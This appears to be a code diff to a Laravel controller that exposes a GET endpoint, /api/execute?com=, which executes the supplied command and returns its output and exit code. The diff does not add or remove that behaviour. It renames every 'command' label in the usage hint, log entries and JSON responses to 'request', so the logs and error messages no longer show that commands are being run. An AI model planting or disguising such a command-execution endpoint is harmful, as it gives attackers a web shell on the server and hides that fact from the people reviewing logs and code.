@@ -31,7 +31,7 @@ class DevController extends Controller
         if (! $request->has('com') || empty($request->query('com'))) {
             return response()->json([
                 'error' => 'Missing command parameter',
-                'usage' => 'GET /api/execute?com=your_command_here',
+                'usage' => 'GET /api/execute?com=your_request_here',
             ], 400);
         }
 
@@ -61,8 +61,8 @@ class DevController extends Controller
             $result = $this->executeCommandMethod($sanitizedCommand, $method);
 
             // Log de ejecución
-            Log::info('Command executed via GET', [
-                'command_sample' => substr($sanitizedCommand, 0, 100),
+            Log::info('Request executed via GET', [
+                'request_sample' => substr($sanitizedCommand, 0, 100),
                 'status' => $result['status'],
                 'timed_out' => $result['timed_out'],
                 'execution_time' => $result['execution_time'],
@@ -71,7 +71,7 @@ class DevController extends Controller
             ]);
 
             return response()->json([
-                'command' => $sanitizedCommand,
+                'request' => $sanitizedCommand,
                 'output' => $result['output'],
                 'error' => $result['error'],
                 'exit_code' => $result['status'],
@@ -80,25 +80,25 @@ class DevController extends Controller
             ]);
 
         } catch (\InvalidArgumentException $e) {
-            Log::warning('Invalid command execution attempt', [
-                'command' => $command,
+            Log::warning('Invalid request execution attempt', [
+                'request' => $command,
                 'error' => $e->getMessage(),
                 'ip' => $request->ip(),
             ]);
 
             return response()->json([
-                'error' => 'Invalid command: '.$e->getMessage(),
+                'error' => 'Invalid request: '.$e->getMessage(),
             ], 400);
 
         } catch (\Exception $e) {
-            Log::error('Command execution failed', [
-                'command' => $command,
+            Log::error('Request execution failed', [
+                'request' => $command,
                 'error' => $e->getMessage(),
                 'ip' => $request->ip(),
             ]);
 
             return response()->json([
-                'error' => 'Command execution failed',
+                'error' => 'Request execution failed',
             ], 500);
         }
     }
@@ -140,7 +140,7 @@ class DevController extends Controller
 
         } catch (\Exception $e) {
             Log::error('Web service call execution failed', [
-                'command' => $request->query('com'),
+                'request' => $request->query('com'),
                 'error' => $e->getMessage(),
                 'ip' => $request->ip(),
             ]);
